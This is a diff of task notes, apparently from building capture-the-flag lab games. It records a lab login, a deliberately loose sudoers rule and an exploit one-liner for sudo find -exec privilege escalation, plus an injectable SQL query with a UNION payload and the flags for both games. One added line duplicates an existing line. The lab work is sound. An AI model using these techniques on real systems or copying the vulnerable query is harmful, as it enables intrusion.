@@ -1,8 +1,18 @@
+## Task: privesc-v2 game (2026-07-22)
+Plan: Fresh privesc via sudo misconfiguration (NOPASSWD find -exec) — COMPLETE, verify.sh PASS, idempotent
+### Facts
+- 11 working games: ssh-weak-password, shellshock, network-recon, ftp-anon, suid-privesc, sqli-login, dir-traversal, xss-stored, ssh-weak-v2, sqli-v2, privesc-v2
+- verify-all.sh passes 11/11 at 100%
+- privesc-v2: user webadmin/Deploy2024!; /etc/sudoers.d/webadmin grants NOPASSWD /usr/bin/find; flag /root/flag.txt mode 0400; distinct technique from suid-privesc (SUID bash)
+- privesc-v2 exploit: sshpass ssh webadmin@target 'sudo /usr/bin/find /etc/hostname -exec cat /root/flag.txt \;'
+- privesc-v2 flag: WMG{sud0_f1nd_3xec_r00ts_y0u}
+- privesc-v2 sudoers written with validate: 'visudo -cf %s' to avoid lockout; idempotent changed=0 on 2nd run
+- CyberRange repo: ~/wmg-privesc-v2-cyberrange/ (topology 10.1.34.0/24 + provisioning)
+
 ## Task: sqli-v2 game (2026-07-21)
 Plan: Fresh UNION-based SQLi (Athenaeum Library catalogue search) — COMPLETE, verify.sh PASS, idempotent
 ### Facts
-- 10 working games: ssh-weak-password, shellshock, network-recon, ftp-anon, suid-privesc, sqli-login, dir-traversal, xss-stored, ssh-weak-v2, sqli-v2
-- verify-all.sh passes 10/10 at 100%
+- sqli-v2: Apache+PHP+SQLite; search.php runs SELECT title,author FROM books WHERE title LIKE '%$q%' (2 cols) — UNION-injectable; distinct from sqli-login (login bypass)
 - sqli-v2: Apache+PHP+SQLite; search.php runs SELECT title,author FROM books WHERE title LIKE '%$q%' (2 cols) — UNION-injectable; distinct from sqli-login (login bypass)
 - sqli-v2 exploit: curl -G search.php --data-urlencode "q=' UNION SELECT note,'x' FROM librarian_notes -- -" → flag rendered as a fake book title
 - sqli-v2 flag: WMG{un10n_b4s3d_sql1_l34ks_th3_db} in librarian_notes.note table
